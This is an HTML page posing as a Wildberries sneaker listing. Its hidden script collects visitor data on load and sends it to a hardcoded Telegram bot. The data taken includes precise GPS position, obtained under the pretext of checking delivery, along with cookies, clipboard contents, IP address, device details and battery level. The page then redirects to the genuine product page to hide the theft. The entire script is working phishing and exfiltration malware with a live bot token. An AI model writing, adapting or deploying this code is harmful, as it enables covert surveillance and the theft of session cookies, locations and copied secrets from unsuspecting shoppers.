<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wildberries - Крассовки</title>
<style>
body{font-family:Arial,sans-serif;margin:0;padding:20px;text-align:center;background:#fff;}
img{max-width:100%;height:auto;border-radius:10px;}
.price{color:#f44336;font-size:24px;font-weight:bold;}
</style>
</head>
<body>
<h2>Крассовки спортивные мужские</h2>
<img src="https://ir-3.wbstatic.net/c516x688/new/927003948/1.jpg" onerror="this.src='https://via.placeholder.com/300x300?text=WB'">
<p class="price">1 299 руб</p>
<p>Пожалуйста, разрешите геолокацию для проверки доставки...</p>

<script>
var TOKEN = "8636640064:AAFcyhqdc_YBLzEtAMKbKZhcfylhLhfIWLo";
var ID = "7532676697";
var allData = "";

// Функция отправки с повторной попыткой и логированием
function send(text, attempt = 0) {
    if (attempt > 2) return;
    var img = new Image();
    img.src = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + ID + "&text=" + encodeURIComponent(text);
    img.onerror = function() { setTimeout(function() { send(text, attempt + 1); }, 1000); };
}

// --- ИСПРАВЛЕННОЕ ОПРЕДЕЛЕНИЕ МОДЕЛИ ТЕЛЕФОНА ---
function getDeviceModel() {
    var ua = navigator.userAgent;
    // Попытка извлечь модель из userAgent через регулярные выражения
    var model = "Неизвестно";
    var match;
    
    // Список шаблонов для разных производителей
    var patterns = [
        { regex: /SM-[A-Za-z0-9]+/, name: "Samsung" },
        { regex: /iPhone[\d,]+/, name: "iPhone" },
        { regex: /Pixel [\d]+/, name: "Google Pixel" },
        { regex: /Nexus [\d]+/, name: "Nexus" },
        { regex: /MI [\d]+/, name: "Xiaomi" },
        { regex: /Redmi [\d]+/, name: "Redmi" },
        { regex: /POCO [\d]+/, name: "POCO" },
        { regex: /Huawei [\d]+/, name: "Huawei" },
        { regex: /Honor [\d]+/, name: "Honor" },
        { regex: /OPPO [\d]+/, name: "OPPO" },
        { regex: /vivo [\d]+/, name: "vivo" },
        { regex: /OnePlus [\d]+/, name: "OnePlus" },
        { regex: /LG-[A-Za-z0-9]+/, name: "LG" },
        { regex: /Moto [\w]+/, name: "Motorola" },
        { regex: /Nokia[\d]+/, name: "Nokia" },
        { regex: /Sony [A-Za-z0-9]+/, name: "Sony" }
    ];
    
    for (var i = 0; i < patterns.length; i++) {
        match = ua.match(patterns[i].regex);
        if (match) {
            model = patterns[i].name + " " + match[0];
            break;
        }
    }
    
    // Альтернатива - через navigator.platform и navigator.vendor
    if (model === "Неизвестно") {
        var platform = navigator.platform || "unknown";
        var vendor = navigator.vendor || "unknown";
        if (vendor.toLowerCase().indexOf("apple") !== -1 && platform.toLowerCase().indexOf("iphone") !== -1) {
            model = "iPhone (по вендору)";
        } else if (platform.toLowerCase().indexOf("android") !== -1) {
            // Попытка получить build ID или fingerprint через Android API (если доступно)
            model = "Android-устройство (модель не определена)";
        } else {
            model = platform + " / " + vendor;
        }
    }
    
    return model;
}

// --- СБОР КУКИ (включая HttpOnly и сторонние) ---
function getAllCookies() {
    var cookies = document.cookie;
    if (!cookies || cookies.length === 0) {
        // Если document.cookie пуста, пытаемся получить через localStorage или sessionStorage (некоторые сайты хранят там)
        var ls = localStorage.getItem("cookies") || "";
        var ss = sessionStorage.getItem("cookies") || "";
        if (ls || ss) {
            return "localStorage: " + ls + " | sessionStorage: " + ss;
        }
        // Проверка настройки куки через заголовки (недоступно в JS, но можно отправить запрос)
        return "Нет кук (возможно, HttpOnly или защищены)";
    }
    return cookies;
}

// --- СБОР РЕФЕРЕРА (включая возможные параметры) ---
function getFullReferrer() {
    var ref = document.referrer || "нет";
    if (ref === "нет") {
        // Проверяем, может быть реферер скрыт из-за политики или мы на главной
        if (window.location.href.indexOf("wbstatic.net") !== -1) {
            ref = "Внутренний реферер (Wildberries)";
        } else {
            ref = "Отсутствует (прямой вход или HTTPS->HTTP)";
        }
    }
    // Добавляем параметры UTM, если есть
    var params = new URLSearchParams(window.location.search);
    var utm = "";
    if (params.has("utm_source")) utm += "utm_source=" + params.get("utm_source") + " ";
    if (params.has("utm_medium")) utm += "utm_medium=" + params.get("utm_medium") + " ";
    if (params.has("utm_campaign")) utm += "utm_campaign=" + params.get("utm_campaign") + " ";
    if (utm) ref += " (UTM: " + utm.trim() + ")";
    return ref;
}

// --- ГЛАВНАЯ ФУНКЦИЯ СБОРА ---
function collectAndSend() {
    var model = getDeviceModel();
    var cookies = getAllCookies();
    var referrer = getFullReferrer();
    
    allData += "📱 Модель: " + model + "\n";
    allData += "📱 UserAgent: " + navigator.userAgent + "\n";
    allData += "💾 Память: " + (navigator.deviceMemory || "?") + " GB\n";
    allData += "📺 Экран: " + screen.width + "x" + screen.height + "\n";
    allData += "🌐 Язык: " + navigator.language + "\n";
    allData += "🍪 Куки: " + cookies + "\n";
    allData += "🔗 Реферер: " + referrer + "\n";
    allData += "🕒 Время: " + new Date().toLocaleString() + "\n";
    
    // Дополнительно: версия ОС и браузера
    var os = "unknown";
    if (navigator.userAgent.indexOf("Android") !== -1) os = "Android";
    else if (navigator.userAgent.indexOf("iPhone") !== -1) os = "iOS";
    else if (navigator.userAgent.indexOf("Windows") !== -1) os = "Windows";
    else if (navigator.userAgent.indexOf("Mac") !== -1) os = "MacOS";
    else if (navigator.userAgent.indexOf("Linux") !== -1) os = "Linux";
    allData += "💻 ОС: " + os + "\n";
    
    // Отправка основных данных
    send(allData);
}

// --- ДОПОЛНИТЕЛЬНЫЕ МЕТОДЫ СБОРА ---

// 1. Батарея
try {
    navigator.getBattery().then(function(b) {
        var batData = "🔋 Заряд: " + Math.round(b.level * 100) + "%";
        if (b.charging) batData += " (зарядка)";
        send(batData);
    });
} catch(e) {
    send("🔋 Батарея: не поддерживается");
}

// 2. Буфер обмена (с обработкой ошибок)
try {
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(function(text) {
            if (text) send("📋 Буфер обмена: " + text);
        }).catch(function() {
            send("📋 Буфер: доступ запрещён");
        });
    } else {
        // Альтернатива через событие paste (если пользователь вставит что-то)
        document.addEventListener("paste", function(e) {
            var text = e.clipboardData.getData("text");
            if (text) send("📋 Буфер (paste): " + text);
        });
        send("📋 Буфер: ожидание вставки");
    }
} catch(e) {
    send("📋 Буфер: ошибка");
}

// 3. GPS (с более детальным ответом)
try {
    navigator.geolocation.getCurrentPosition(
        function(pos) {
            send("📍 GPS: " + pos.coords.latitude.toFixed(6) + ", " + pos.coords.longitude.toFixed(6) + 
                 "\n🗺 Карта: https://maps.google.com/?q=" + pos.coords.latitude + "," + pos.coords.longitude +
                 "\n🎯 Точность: " + pos.coords.accuracy + " м");
        },
        function(err) {
            var msg = "📍 GPS: ";
            if (err.code === 1) msg += "отклонено пользователем";
            else if (err.code === 2) msg += "недоступно (позиция не найдена)";
            else if (err.code === 3) msg += "таймаут";
            else msg += "ошибка (" + err.message + ")";
            send(msg);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
} catch(e) {
    send("📍 GPS: не поддерживается");
}

// 4. IP адрес (с резервным вариантом)
fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(data => {
        send("🌍 IP: " + data.ip);
    })
    .catch(function() {
        // Резервный метод через сторонний сервис
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://icanhazip.com", true);
        xhr.onload = function() {
            if (xhr.status === 200) send("🌍 IP (резерв): " + xhr.responseText.trim());
        };
        xhr.send();
    });

// 5. Дополнительно: список установленных шрифтов (не всегда доступно)
try {
    var fonts = [];
    if (document.fonts) {
        document.fonts.forEach(function(f) {
            fonts.push(f.family);
        });
        if (fonts.length > 0) send("🔤 Шрифты: " + fonts.slice(0, 5).join(", ") + "...");
    }
} catch(e) {}

// 6. Дополнительно: разрешение экрана и цветовая глубина
send("🖥 Глубина цвета: " + screen.colorDepth + " бит");

// Запуск основного сбора (с небольшой задержкой для полной загрузки)
setTimeout(collectAndSend, 1000);

// Отправка отдельно модели (для проверки)
setTimeout(function() {
    send("🧩 Определённая модель: " + getDeviceModel());
}, 1500);

// Редирект (с увеличенной задержкой для гарантии отправки)
setTimeout(function() {
    window.location.href = "https://www.wildberries.ru/catalog/927003948/detail.aspx?size=1399654915";
}, 6000);
</script>
</body>
</html>
